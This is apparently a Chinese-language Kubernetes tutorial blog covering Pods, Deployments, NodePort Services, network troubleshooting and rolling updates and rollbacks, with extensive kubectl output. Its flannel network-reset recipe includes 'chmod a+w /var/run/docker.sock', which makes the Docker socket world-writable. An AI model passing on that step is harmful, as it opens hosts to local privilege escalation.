{\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;annotations\u0026#34;:{},\u0026#34;labels\u0026#34;:{\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;zone\u0026#34;:\u0026#34;prod\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;hello-pod\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;spec\u0026#34;:{\u0026#34;containers\u0026#34;:[{\u0026#34;image\u0026#34;:\u0026#34;nigelpoulton/k8sbook:latest\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;hello-ctr\u0026#34;,\u0026#34;ports\u0026#34;:[{\u0026#34;containerPort\u0026#34;:8080}]}]}} creationTimestamp: \u0026#34;2022-01-19T10:26:35Z\u0026#34; labels: version: v1 zone: prod name: hello-pod namespace: default resourceVersion: \u0026#34;29553\u0026#34; uid: 1f41e62a-a951-4593-83f7-f3e7398b9d24 spec:\t# 这部分是Pod的期望状态 containers: - image: nigelpoulton/k8sbook:latest imagePullPolicy: Always name: hello-ctr ports: - containerPort: 8080 protocol: TCP resources: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/run/secrets/kubernetes.io/serviceaccount name: kube-api-access-5kwmz readOnly: true dnsPolicy: ClusterFirst enableServiceLinks: true nodeName: lzl-c preemptionPolicy: PreemptLowerPriority priority: 0 restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: default serviceAccountName: default terminationGracePeriodSeconds: 30 tolerations: - effect: NoExecute key: node.kubernetes.io/not-ready operator: Exists tolerationSeconds: 300 - effect: NoExecute key: node.kubernetes.io/unreachable operator: Exists tolerationSeconds: 300 volumes: - name: kube-api-access-5kwmz projected: defaultMode: 420 sources: - serviceAccountToken: expirationSeconds: 3607 path: token - configMap: items: - key: ca.crt path: ca.crt name: kube-root-ca.crt - downwardAPI: items: - fieldRef: apiVersion: v1 fieldPath: metadata.namespace path: namespace status:\t# 这部分是Pod的当前状态 conditions: - lastProbeTime: null lastTransitionTime: \u0026#34;2022-01-19T10:26:35Z\u0026#34; status: \u0026#34;True\u0026#34; type: Initialized - lastProbeTime: null lastTransitionTime: \u0026#34;2022-01-19T10:26:58Z\u0026#34; status: \u0026#34;True\u0026#34; type: Ready - lastProbeTime: null lastTransitionTime: \u0026#34;2022-01-19T10:26:58Z\u0026#34; status: \u0026#34;True\u0026#34; type: ContainersReady - lastProbeTime: null lastTransitionTime: \u0026#34;2022-01-19T10:26:35Z\u0026#34; status: \u0026#34;True\u0026#34; type: PodScheduled containerStatuses: - containerID: docker://a7cc9815fc32e3f99f57553c6c28aa264576dbc3076784fee485a4306a1f4fcb image: nigelpoulton/k8sbook:latest imageID: docker-pullable://nigelpoulton/k8sbook@sha256:a983a96a85151320cd6ad0cd9fda3b725a743ed642e58b0597285c6bcb46c90f lastState: {} name: hello-ctr ready: true restartCount: 0 started: true state: running: startedAt: \u0026#34;2022-01-19T10:26:58Z\u0026#34; hostIP: 192.168.230.13 phase: Running podIP: 10.5.2.2 podIPs: - ip: 10.5.2.2 qosClass: BestEffort startTime: \u0026#34;2022-01-19T10:26:35Z\u0026#34; kubectl describe Pods hello-pod root@lzl:/home/lzl# kubectl describe Pods hello-pod Name: hello-pod Namespace: default Priority: 0 Node: lzl-c/192.168.230.13 Start Time: Wed, 19 Jan 2022 18:26:35 +0800 Labels: version=v1 zone=prod Annotations: \u0026lt;none\u0026gt; Status: Running IP: 10.5.2.2 IPs: IP: 10.5.2.2 Containers: hello-ctr: Container ID: docker://a7cc9815fc32e3f99f57553c6c28aa264576dbc3076784fee485a4306a1f4fcb Image: nigelpoulton/k8sbook:latest Image ID: docker-pullable://nigelpoulton/k8sbook@sha256:a983a96a85151320cd6ad0cd9fda3b725a743ed642e58b0597285c6bcb46c90f Port: 8080/TCP Host Port: 0/TCP State: Running Started: Wed, 19 Jan 2022 18:26:58 +0800 Ready: True Restart Count: 0 Environment: \u0026lt;none\u0026gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-5kwmz (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: kube-api-access-5kwmz: Type: Projected (a volume that contains injected data from multiple sources) TokenExpirationSeconds: 3607 ConfigMapName: kube-root-ca.crt ConfigMapOptional: \u0026lt;nil\u0026gt; DownwardAPI: true QoS Class: BestEffort Node-Selectors: \u0026lt;none\u0026gt; Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events:\t# Pod生命周期中的一些重要事件 Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 6m56s default-scheduler Successfully assigned default/hello-pod to lzl-c Normal Pulling 6m54s kubelet Pulling image \u0026#34;nigelpoulton/k8sbook:latest\u0026#34; Normal Pulled 6m33s kubelet Successfully pulled image \u0026#34;nigelpoulton/k8sbook:latest\u0026#34; in 21.212884013s Normal Created 6m33s kubelet Created container hello-ctr Normal Started 6m33s kubelet Started container hello-ctr 进入Pod中的容器内部 还可以进入容器执行命令，来查看Pod的信息：kubectl exec hello-pod -- ps aux root@lzl:/home/lzl# kubectl exec hello-pod -- ps aux PID USER TIME COMMAND 1 root 0:00 node ./app.js 13 root 0:00 ps aux 登录到运行容器内部：kubectl exec -it hello-pod -- sh root@lzl:/home/lzl# kubectl exec -it hello-pod -- sh /src # ls Dockerfile app.js package-lock.json views README.md node_modules package.json /src # exit root@lzl:/home/lzl# 当Pod中有多个容器时，需要使用--container参数指定想要创建交互式会话的容器，不指定的话默认是第一个容器。\n使用exit退出当前容器。\n删除Pod kubectl delete -f pod.yaml root@lzl:/home/lzl# kubectl delete -f ./WorkSpace/k8s/pod/Pod.yml pod \u0026#34;hello-pod\u0026#34; deleted root@lzl:/home/lzl# kubectl get Pods No resources found in default namespace. 使用Deployment部署Pod Deployment为Kubernetes带来自愈、自动扩缩容、滚动升级以及基于版本的回滚的能力。实际上在底层Deployment是使用的ReplicaSet来完成的，可以理解为，Deployment管理ReplicaSet，而ReplicaSet管理Pod。\n部署Deployment 本次部署的文件deploy.yaml如下：\napiVersion: apps/v1 kind: Deployment metadata: name: hello-deploy spec: # spec下的内容都与Pod有关 replicas: 10 selector: # 表示该Deployment所管理的Pod必须要有的标签 matchLabels: app: hello-world minReadySeconds: 10 strategy: # 表示更新策略 type: RollingUpdate rollingUpdate: maxUnavailable: 1 maxSurge: 1 template: # 所管理的Pod的模板，这里只有一个容器 metadata: labels: app: hello-world spec: containers: - name: hello-pod image: nigelpoulton/k8sbook:latest ports: - containerPort: 8080 进行部署：\nroot@lzl:/home/lzl# kubectl apply -f ./WorkSpace/k8s/deployment/deploy.yaml deployment.apps/hello-deploy created 查看Deployment 使用kubectl get root@lzl:/home/lzl# kubectl get deploy hello-deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 10/10 10 10 2m29s 使用kubectl describe root@lzl:/home/lzl# kubectl describe deploy hello-deploy Name: hello-deploy Namespace: default CreationTimestamp: Wed, 19 Jan 2022 19:18:16 +0800 Labels: \u0026lt;none\u0026gt; Annotations: deployment.kubernetes.io/revision: 1 Selector: app=hello-world Replicas: 10 desired | 10 updated | 10 total | 10 available | 0 unavailable StrategyType: RollingUpdate MinReadySeconds: 10 RollingUpdateStrategy: 1 max unavailable, 1 max surge Pod Template: Labels: app=hello-world Containers: hello-pod: Image: nigelpoulton/k8sbook:latest Port: 8080/TCP Host Port: 0/TCP Environment: \u0026lt;none\u0026gt; Mounts: \u0026lt;none\u0026gt; Volumes: \u0026lt;none\u0026gt; Conditions: Type Status Reason ---- ------ ------ Available True MinimumReplicasAvailable Progressing True NewReplicaSetAvailable OldReplicaSets: \u0026lt;none\u0026gt; NewReplicaSet: hello-deploy-65cbc9474c (10/10 replicas created) Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal ScalingReplicaSet 4m17s deployment-controller Scaled up replica set hello-deploy-65cbc9474c to 10 可以使用kubectl get rs来查看ReplicaSet的状态，以及kubectl describe rs来查看其详细信息\nroot@lzl:/home/lzl# kubectl get rs NAME DESIRED CURRENT READY AGE hello-deploy-65cbc9474c 10 10 10 5m55s root@lzl:/home/lzl# kubectl describe rs hello-deploy-65cbc9474c Name: hello-deploy-65cbc9474c Namespace: default Selector: app=hello-world,pod-template-hash=65cbc9474c Labels: app=hello-world pod-template-hash=65cbc9474c Annotations: deployment.kubernetes.io/desired-replicas: 10 deployment.kubernetes.io/max-replicas: 11 deployment.kubernetes.io/revision: 1 Controlled By: Deployment/hello-deploy Replicas: 10 current / 10 desired Pods Status: 10 Running / 0 Waiting / 0 Succeeded / 0 Failed Pod Template: Labels: app=hello-world pod-template-hash=65cbc9474c Containers: hello-pod: Image: nigelpoulton/k8sbook:latest Port: 8080/TCP Host Port: 0/TCP Environment: \u0026lt;none\u0026gt; Mounts: \u0026lt;none\u0026gt; Volumes: \u0026lt;none\u0026gt; Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-plhwm Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-8fdqs Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-dlv5g Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-x2ddb Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-qgffd Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-67nlw Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-gg4r2 Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-b2v4v Normal SuccessfulCreate 7m39s replicaset-controller Created pod: hello-deploy-65cbc9474c-vbzrd Normal SuccessfulCreate 7m39s replicaset-controller (combined from similar events): Created pod: hello-deploy-65cbc9474c-pjwsh 访问部署的应用 对于Pod来说，其IP会由于销毁或者重建而改变，Pod的IP是一个变量，通常不能直接使用Pod的IP作为通讯。在K8s中，Kubernetes Service对象则解决了这一问题，它为一组Pod提供了一个固定的DNS域名和IP地址。\n下面定义一个Service与上述Pod进行协同工作。\nsvc.yaml：\napiVersion: v1 kind: Service metadata: name: hello-svc labels: app: hello-world spec: type: NodePort ports: - port: 8080 nodePort: 30001 protocol: TCP selector: app: hello-world 部署Service：\nroot@lzl:/home/lzl# kubectl apply -f ./WorkSpace/k8s/service/svc.yaml service/hello-svc created 这样我们有两种方式可以访问该应用：\n在集群内部使用DNS名称hello-svc和端口8080访问 在集群外部通过集群的任意节点和端口号30001访问 首先我们查看我们刚部署的这10个Pod实例的具体信息：\nroot@lzl:/home/lzl# kubectl get pods -l app=hello-world -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hello-deploy-65cbc9474c-67nlw 1/1 Running 0 72m 10.5.1.4 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-8fdqs 1/1 Running 0 72m 10.5.2.6 lzl-c \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-b2v4v 1/1 Running 0 72m 10.5.2.4 lzl-c \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-dlv5g 1/1 Running 0 72m 10.5.2.7 lzl-c \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-gg4r2 1/1 Running 0 72m 10.5.2.5 lzl-c \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-pjwsh 1/1 Running 0 72m 10.5.2.3 lzl-c \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-plhwm 1/1 Running 0 72m 10.5.1.5 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-qgffd 1/1 Running 0 72m 10.5.1.2 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-vbzrd 1/1 Running 0 72m 10.5.1.6 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-x2ddb 1/1 Running 0 72m 10.5.1.3 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; k8s自动为这些Pod分配了IP地址。\n引自官方文档：\nKubernetes Service 从逻辑上定义了运行在集群中的一组 Pod，这些 Pod 提供了相同的功能。 当每个 Service 创建时，会被分配一个唯一的 IP 地址（也称为 clusterIP）。 这个 IP 地址与一个 Service 的生命周期绑定在一起，当 Service 存在的时候它也不会改变。 可以配置 Pod 使它与 Service 进行通信，Pod 知道与 Service 通信将被自动地负载均衡到该 Service 中的某些 Pod 上。\n我们查看创建的Service的信息：\nroot@lzl:/home/lzl# kubectl get svc hello-svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE hello-svc NodePort 10.110.196.234 \u0026lt;none\u0026gt; 8080:30001/TCP 19m root@lzl:/home/lzl# kubectl describe svc hello-svc Name: hello-svc Namespace: default Labels: app=hello-world Annotations: \u0026lt;none\u0026gt; Selector: app=hello-world Type: NodePort IP Family Policy: SingleStack IP Families: IPv4 IP: 10.110.196.234 IPs: 10.110.196.234 Port: \u0026lt;unset\u0026gt; 8080/TCP TargetPort: 8080/TCP NodePort: \u0026lt;unset\u0026gt; 30001/TCP Endpoints: 10.5.1.2:8080,10.5.1.3:8080,10.5.1.4:8080 + 7 more... Session Affinity: None External Traffic Policy: Cluster Events: \u0026lt;none\u0026gt; 这里我遇到了集群内部和集群外部都无法访问应用的情况\n集群内部无法访问 在Pod运行的节点上可以访问，但是在集群其他节点上无法访问 无法访问Service 集群外部无法访问：可以通过运行Pod的主机地址访问，而无法通过没有运行Pod的集群主机地址进行访问 解决方案在下一节\n将问题解决后，我们来看。\nroot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hello-deploy-59866ff45-2hp8j 1/1 Running 1 (8m20s ago) 39m 10.5.1.4 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-4lhld 1/1 Running 1 (8m20s ago) 38m 10.5.1.11 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-7pn94 1/1 Running 1 (8m20s ago) 35m 10.5.1.5 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-9d444 1/1 Running 1 (8m20s ago) 35m 10.5.1.3 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-lhx2j 1/1 Running 1 (8m20s ago) 37m 10.5.1.9 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-nwcp8 1/1 Running 1 (8m20s ago) 36m 10.5.1.2 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-prwwd 1/1 Running 1 (8m19s ago) 36m 10.5.1.7 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-rflnv 1/1 Running 1 (8m19s ago) 34m 10.5.1.6 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-tbpt2 1/1 Running 1 (8m19s ago) 37m 10.5.1.10 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-z88ct 1/1 Running 1 (8m19s ago) 39m 10.5.1.8 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get svc -o wide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR hello-svc NodePort 10.101.13.201 \u0026lt;none\u0026gt; 8080:30001/TCP 18h app=hello-world kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 18h \u0026lt;none\u0026gt; 从集群内访问 以服务实例hello-deploy-59866ff45-2hp8j为例，其地址为10.5.1.4:8080。因此，在集群内部任何一台机器访问该地址都可以访问到这个应用。\n同样的，hello-svc的地址是10.101.13.201:8080，加入集群的任何一台主机都可以通过该地址访问到应用。\n**特别的，与Pod的IP不同，Service的IP是固定不变的，而Pod的IP会跟随Deployment的更新、扩缩容等操作改变。**Service实际上相当于所有Pod的一个网关，它有固定的IP地址，并且将请求Pod的流量负载均衡到不同的Pod上，并在Pod地址改变时完成服务发现。\n从集群外访问 如果在集群外，那么访问集群内的任何一台主机的30001端口都可以连接到该应用，因为前面svc.yaml：\nports: - port: 8080 nodePort: 30001 protocol: TCP 帮我们做了集群内到集群外的端口映射。\n解决由于iptables版本差异导致的K8s网络问题 如上文，我是用Ubuntu18.04搭建K8s1.22.4集群，在启动Service做应用网络入口时，出现了上述问题。找了很久的资料之后认为是k8s1.22.4在使用iptables配置网络规则时由于版本较新，其使用的配置命令在Ubuntu18.04版本上的iptables无法解析，导致网络出现问题。\nhttps://bugs.launchpad.net/ubuntu/+source/linux-meta-hwe-5.4/+bug/1899690 所以我将虚拟机换为Ubuntu20.04后，该问题得到解决。由此看出，K8s对于环境版本一致性的要求还是比较高的。\n解决由于虚拟机挂起，恢复虚拟机后集群网络异常的问题 在虚拟机挂起，再恢复之后，集群网络出现了问题，具体表现在：\n无法通过Pod地址访问应用 无法通过Service地址访问应用 集群间Pod无法联通 在一篇博文中找到了解决方法：https://blog.csdn.net/weixin_43293361/article/details/114731838\n首先，查看Master Node的网络，发现原本的cni0和flannel.1网络均不存在了：\n然后查看了Work Node的网络，上述两个网络也是不存在的。所以按照博文给出的方法：\n1）在Master Node删除flannel网络组件：\nkubectl delete -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 2）在Master Node和Work Node上重置集群网络配置（集群所有节点上）：\nifconfig cni0 down ip link delete cni0 ifconfig flannel.1 down ip link delete flannel.1 rm -rf /var/lib/cni/flannel/* rm -rf /var/lib/cni/networks/cbr0/* rm -rf /var/lib/cni/cache/* rm -f /etc/cni/net.d/* systemctl restart kubelet systemctl restart docker chmod a+w /var/run/docker.sock 3）最后在Master Node重新安装flannel网络组件：\nkubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 4）查看集群各个节点的网络情况，cni0和flannel.1网络均正常出现，然后等待Deployment的Pod自愈，这样集群网络就可以正常恢复。\n滚动升级与回滚 滚动升级 在升级使用的deploy.yaml文件中：\napiVersion: apps/v1 kind: Deployment metadata: name: hello-deploy spec: replicas: 10 selector: matchLabels: app: hello-world minReadySeconds: 10 strategy: type: RollingUpdate\t# 滚动更新 rollingUpdate: maxUnavailable: 1\t# 集群中最多有一个不可用Pod maxSurge: 1\t# 集群中Pod最多超过预期值1个 template: metadata: labels: app: hello-world spec: containers: - name: hello-pod image: nigelpoulton/k8sbook:edge\t# 使用了另一个版本的镜像 ports: - containerPort: 8080 与上一个deploy.yaml不同，这里使用了另一个版本的镜像，更新策略由strategy下的内容决定。\n进行滚动升级：\nroot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl apply -f deploy.yaml --record Flag --record has been deprecated, --record will be removed in the future deployment.apps/hello-deploy configured root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl rollout status deployment hello-deploy Waiting for deployment \u0026#34;hello-deploy\u0026#34; rollout to finish: 2 out of 10 new replicas have been updated... ^Croot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 10/10 2 9 17h root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 10/10 3 9 17h root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 9/10 5 9 17h 可以看到，如Docker Swarm一样，在升级过程中，同时存在新版本与旧版本的应用，直至整个升级过程结束。\nroot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get deploy hello-deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 10/10 10 10 17h 回滚 Kubernetes会维护Deployment的版本历史记录：\nroot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl rollout history deployment hello-deploy deployment.apps/hello-deploy REVISION CHANGE-CAUSE 1 \u0026lt;none\u0026gt; 2 kubectl apply --filename=deploy.yaml --record=true 对于Deployment依赖的ReplicaSet来说，每次更新都会保留旧版本的ReplicaSet同时创建一个新的ReplicaSet：\nroot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get rs NAME DESIRED CURRENT READY AGE hello-deploy-59866ff45 10 10 10 158m hello-deploy-65cbc9474c 0 0 0 20h root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl describe rs Name: hello-deploy-59866ff45 Namespace: default Selector: app=hello-world,pod-template-hash=59866ff45 Labels: app=hello-world pod-template-hash=59866ff45 Annotations: deployment.kubernetes.io/desired-replicas: 10 deployment.kubernetes.io/max-replicas: 11 deployment.kubernetes.io/revision: 2 kubernetes.io/change-cause: kubectl apply --filename=deploy.yaml --record=true Controlled By: Deployment/hello-deploy Replicas: 10 current / 10 desired Pods Status: 10 Running / 0 Waiting / 0 Succeeded / 0 Failed Pod Template: Labels: app=hello-world pod-template-hash=59866ff45 Containers: hello-pod: Image: nigelpoulton/k8sbook:edge Port: 8080/TCP Host Port: 0/TCP Environment: \u0026lt;none\u0026gt; Mounts: \u0026lt;none\u0026gt; Volumes: \u0026lt;none\u0026gt; Events: \u0026lt;none\u0026gt; Name: hello-deploy-65cbc9474c Namespace: default Selector: app=hello-world,pod-template-hash=65cbc9474c Labels: app=hello-world pod-template-hash=65cbc9474c Annotations: deployment.kubernetes.io/desired-replicas: 10 deployment.kubernetes.io/max-replicas: 11 deployment.kubernetes.io/revision: 1 Controlled By: Deployment/hello-deploy Replicas: 0 current / 0 desired Pods Status: 0 Running / 0 Waiting / 0 Succeeded / 0 Failed Pod Template: Labels: app=hello-world pod-template-hash=65cbc9474c Containers: hello-pod: Image: nigelpoulton/k8sbook:latest Port: 8080/TCP Host Port: 0/TCP Environment: \u0026lt;none\u0026gt; Mounts: \u0026lt;none\u0026gt; Volumes: \u0026lt;none\u0026gt; Events: \u0026lt;none\u0026gt; 通过ReplicaSet的信息，可以清楚的知道两个ReplicaSet所做的操作，并且由于旧版本ReplicaSet的存在，回滚操作变得更加简单。下面将应用回滚到版本1，同时别忘记再更新一下yaml文件：\nroot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl rollout undo deployment hello-deploy --to-revision=1 deployment.apps/hello-deploy rolled back root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hello-deploy-59866ff45-2hp8j 1/1 Running 1 (135m ago) 166m 10.5.1.4 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-4lhld 1/1 Running 1 (135m ago) 165m 10.5.1.11 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-7pn94 1/1 Running 1 (135m ago) 162m 10.5.1.5 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-9d444 1/1 Running 1 (135m ago) 162m 10.5.1.3 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-lhx2j 1/1 Terminating 1 (135m ago) 164m 10.5.1.9 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-nwcp8 1/1 Running 1 (135m ago) 163m 10.5.1.2 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-prwwd 1/1 Running 1 (135m ago) 163m 10.5.1.7 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-rflnv 1/1 Running 1 (135m ago) 161m 10.5.1.6 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-tbpt2 1/1 Running 1 (135m ago) 165m 10.5.1.10 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-z88ct 1/1 Running 1 (135m ago) 166m 10.5.1.8 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-98bh2 0/1 ContainerCreating 0 10s \u0026lt;none\u0026gt; lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-d4g24 0/1 ContainerCreating 0 10s \u0026lt;none\u0026gt; lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl rollout status deployment hello-deploy Waiting for deployment \u0026#34;hello-deploy\u0026#34; rollout to finish: 2 out of 10 new replicas have been updated... ^Croot@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hello-deploy-59866ff45-2hp8j 1/1 Running 1 (136m ago) 167m 10.5.1.4 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-4lhld 1/1 Running 1 (136m ago) 166m 10.5.1.11 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-7pn94 1/1 Running 1 (136m ago) 163m 10.5.1.5 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-9d444 1/1 Running 1 (136m ago) 162m 10.5.1.3 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-nwcp8 1/1 Running 1 (136m ago) 164m 10.5.1.2 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-prwwd 1/1 Running 1 (136m ago) 164m 10.5.1.7 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-rflnv 1/1 Terminating 1 (136m ago) 162m 10.5.1.6 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-tbpt2 1/1 Running 1 (136m ago) 165m 10.5.1.10 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-59866ff45-z88ct 1/1 Running 1 (136m ago) 167m 10.5.1.8 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-98bh2 1/1 Running 0 47s 10.5.1.12 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-d4g24 0/1 ContainerCreating 0 47s \u0026lt;none\u0026gt; lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-kglhr 0/1 ContainerCreating 0 2s \u0026lt;none\u0026gt; lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl rollout status deployment hello-deploy Waiting for deployment \u0026#34;hello-deploy\u0026#34; rollout to finish: 3 out of 10 new replicas have been updated... ^[[AWaiting for deployment \u0026#34;hello-deploy\u0026#34; rollout to finish: 3 out of 10 new replicas have been updated... ^Croot@lzl-a:/home/lzl/WP/k8s/deploykubectl get deploy hello-deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 10/10 3 9 20h root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get deploy hello-deploy NAME READY UP-TO-DATE AVAILABLE AGE hello-deploy 10/10 10 10 20h root@lzl-a:/home/lzl/WP/k8s/deploy# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hello-deploy-65cbc9474c-7jrwq 1/1 Running 0 4m32s 10.5.1.19 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-98bh2 1/1 Running 0 7m56s 10.5.1.12 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-d4g24 1/1 Running 0 7m56s 10.5.1.13 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-hkr5r 1/1 Running 0 6m39s 10.5.1.15 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-jdwsr 1/1 Running 0 3m29s 10.5.1.21 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-kglhr 1/1 Running 0 7m11s 10.5.1.14 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-n4mqz 1/1 Running 0 4m1s 10.5.1.20 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-p7zgs 1/1 Running 0 6m7s 10.5.1.16 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-rqtrg 1/1 Running 0 5m36s 10.5.1.17 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hello-deploy-65cbc9474c-xxk2n 1/1 Running 0 5m4s 10.5.1.18 lzl-b \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 